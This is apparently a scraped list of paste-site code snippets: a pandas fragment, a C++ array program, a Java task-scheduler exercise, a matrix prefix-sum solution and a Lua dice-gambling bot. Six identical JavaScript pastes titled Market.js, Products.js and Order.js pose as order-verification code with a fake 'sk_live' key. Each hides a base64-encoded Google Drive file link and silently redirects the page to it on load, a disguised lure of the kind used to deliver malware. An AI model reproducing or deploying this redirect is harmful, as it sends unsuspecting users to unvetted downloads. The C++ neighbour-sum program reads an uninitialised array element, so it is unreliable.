        group['UnitPrice'] = group['UnitPrice'] * 1.10

    return group


def task1(df):
    """"""Основная функция для обработки данных""""""
    # Добавляем столбец с первой буквой страны
    df['FirstLetter'] = df['Country'].str[0]

    # Группируем по первой букве и применяем модификацию цен
    df = df.groupby('FirstLetter', group_keys=False).apply(change_price)

    return df"
Bc801G0x,Untitled,vitormartinotti,C++,Thursday 17th of April 2025 02:38:37 PM CDT,"#include <bits/stdc++.h>

int main() {
    int n; scanf(""%d"", &n);
    
    int campo[n+2];
    campo[0]=0;
    campo[n-1]=0;
    for(int i = 1; i <= n; i++){
        scanf(""%d"", &campo[i]);
    }
    for(int i = 1; i <= n; i++){
        printf(""%d\n"", campo[i]+campo[i-1]+campo[i+1]);
    }
    
    return 0;
}"
yX9idtD2,[NP] Task Scheduler,dzocesrce,Java,Thursday 17th of April 2025 02:37:15 PM CDT,"import java.util.Arrays;
import java.util.Comparator;
import java.util.List;
import java.util.Scanner;
import java.util.stream.Collectors;

/**
 * I Partial exam 2016
 */
public class TaskSchedulerTest {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        int n = scanner.nextInt();
        Task[] timeTasks = new Task[n];
        for (int i = 0; i < n; ++i) {
            int x = scanner.nextInt();
            timeTasks[i] = new TimedTask(x);
        }
        n = scanner.nextInt();
        Task[] priorityTasks = new Task[n];
        for (int i = 0; i < n; ++i) {
            int x = scanner.nextInt();
            priorityTasks[i] = new PriorityTask(x);
        }
        Arrays.stream(priorityTasks).forEach(System.out::println);
        TaskRunner<Task> runner = new TaskRunner<>();
        System.out.println(""=== Ordered tasks ==="");
        System.out.println(""Timed tasks"");
        runner.run(Schedulers.getOrdered(), timeTasks);
        System.out.println(""Priority tasks"");
        runner.run(Schedulers.getOrdered(), priorityTasks);
        int filter = scanner.nextInt();
        System.out.printf(""=== Filtered time tasks with order less then %d ===\n"", filter);
        runner.run(Schedulers.getFiltered(filter), timeTasks);
        System.out.printf(""=== Filtered priority tasks with order less then %d ===\n"", filter);
        runner.run(Schedulers.getFiltered(filter), priorityTasks);
        scanner.close();
    }
}

class TaskRunner<T extends Task> {
    public void run(TaskScheduler<T> scheduler, T[] tasks) {
        List<T> ordered = scheduler.schedule(tasks);
        ordered.forEach(System.out::println);
    }
}

interface TaskScheduler<T extends Task> {
    List<T> schedule(T[] tasks);
}

interface Task {
    int getOrder();
}

class PriorityTask implements Task {
    private final int priority;

    public PriorityTask(int priority) {
        this.priority = priority;
    }

    @Override
    public int getOrder() {
        return priority;
    }

    @Override
    public String toString() {
        return String.format(""PT -> %d"", getOrder());
    }
}

class TimedTask implements Task {
    private final int time;

    public TimedTask(int time) {
        this.time = time;
    }

    @Override
    public int getOrder() {
        return time;
    }

    @Override
    public String toString() {
        return String.format(""TT -> %d"", getOrder());
    }
}

class Schedulers {
    public static <T extends Task> TaskScheduler<T> getOrdered() {
        return new TaskScheduler<T>() {
            @Override
            public List<T> schedule(T[] tasks) {
                return Arrays.stream(tasks)
                        .sorted(Comparator.comparingInt(Task::getOrder))
                        .collect(Collectors.toList());
            }
        };
    }

    public static <T extends Task> TaskScheduler<T> getFiltered(int order) {
        return tasks -> Arrays.stream(tasks)
                .filter(t -> t.getOrder() < order)
                .collect(Collectors.toList());
    }
}
"
UYyPCp2Y,Market.js,kammex,JavaScript,Thursday 17th of April 2025 02:08:42 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95721/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tg1reWRi,-set-drop-reduction,dicekode,Lua,Thursday 17th of April 2025 02:02:52 PM CDT,"minbet   = 0.1
chance   = 19
edge     = 95
basediv  = 1e-5
baserisk = basediv*balance
basebet  = baserisk/(edge/chance)
nextbet  = basebet

nextbet = math.max(nextbet,minbet)
function dobet()
    if partialprofit > 0 then
        resetpartialprofit()
        chance   = math.random(5,30)
        baserisk = basediv*balance 
        basebet  = baserisk/(edge/chance)
        nextbet  = basebet 
    end
    if win then 
        nextbet = basebet
    else
        streak  = math.abs(currentstreak)
        betload = math.abs(partialprofit)/((edge/chance)-1)
        betrisk = 2.5-(streak/100) 
        nextbet = betload*betrisk
        info    = string.format(""[ %.2f ]"",betrisk) .. string.format(""\t[ %.2f ]"",chance) 
    end
    nextbet = math.max(nextbet,minbet)
    manageRisk()
end

ifpause  = 0
ifdrop   = 25
ifprofit = 525

info = """"
sbal,mbal = balance,balance
cdrop,mdrop = 0,0
stwin = false
stbal = balance+(balance*(ifprofit/100))
function manageRisk()

    if balance > stbal and stbal > 0 then stop() end
    if balance > mbal then
        if stwin then stop() end
        if currentprofit/sbal*100 > ifpause and ifpause > 0 then pause() end
        mbal = balance
    end
    cdrop = mbal - balance
    mdrop = math.max(mdrop,cdrop)
    if cdrop/mbal*100 > ifdrop and ifdrop > 0 then stwin = true end
    incdrop = string.format(""[ %.8f ]"", cdrop)
    inmdrop = string.format(""[ %.8f ]"", mdrop) .. string.format("" [ %.2f ]"", mdrop/mbal*100)
    print(""++ drop "" .. incdrop .. ""\t\t"" .. inmdrop .. ""\t"" .. info)
end"
GsZBcDmb,Untitled,kammex,JavaScript,Thursday 17th of April 2025 01:53:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/50963/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
4B65kqc3,Products.js,kammex,JavaScript,Thursday 17th of April 2025 01:37:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96736/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FRSQU2vW,Untitled,aqibm,C++,Thursday 17th of April 2025 01:28:56 PM CDT,"vector<vector<int>> prefSum;
vector<vector<int>> sufSum;
int n,m;
 

int getPrefixSum(int row, int left){
    if(left==0)
        return 0;
    return prefSum[row][left-1];
}

int getSuffixSum(int row, int right){
    if(right==0)
        return 0;
    return sufSum[row][right-1];
}
 

int solve(int row,int k, vector<vector<int>>& matrix){
    if(k==0)
        return 0;
    if(row == n)
        return -1e9;
    int ans = -1;
    for(int i=0;i<=min(m,k);i++){
        for(int j=0;j<=i;j++){
            int left = j;
            int right = i-j; 
            ans = max(ans, getPrefixSum(row,left) + getSuffixSum(row,right) + solve(row + 1, k - i,matrix));
        }
    }
    return ans; 
}

int getMaximumSum(vector<vector<int>> matrix, int k) {
    n = matrix.size();
    m = matrix[0].size();
    prefSum.resize(n, vector<int>(m,0));
    sufSum.resize(n, vector<int>(m,0));
    for(int i=0;i<n;i++){
        for(int j=0;j<m;j++){
            if(j==0){
                prefSum[i][j] = matrix[i][j];
            }
            else{
                prefSum[i][j] = prefSum[i][j-1] + matrix[i][j];
            }
        }
    }
    for(int i=0;i<n;i++){
        for(int j=m-1;j>=0;j--){
            if(j==m-1){
                sufSum[i][j] = matrix[i][j];
            }
            else{
                sufSum[i][j] = sufSum[i][j+1] + matrix[i][j];
            }
        }
        reverse(sufSum[i].begin(),sufSum[i].end());
    }
    return solve(0,k,matrix);
    
}"
0PZdbCfq,Order.js,kammex,JavaScript,Thursday 17th of April 2025 01:21:32 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/54879/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RGgUwDwz,Market.js,kammex,JavaScript,Thursday 17th of April 2025 01:05:48 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/74815/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
9yiwSDKD,Untitled,kammex,JavaScript,Thursday 17th of April 2025 12:50:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/23897/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
shMNzLpS,Products.js,kammex,JavaScript,Thursday 17th of April 2025 12:34:40 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/69488/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
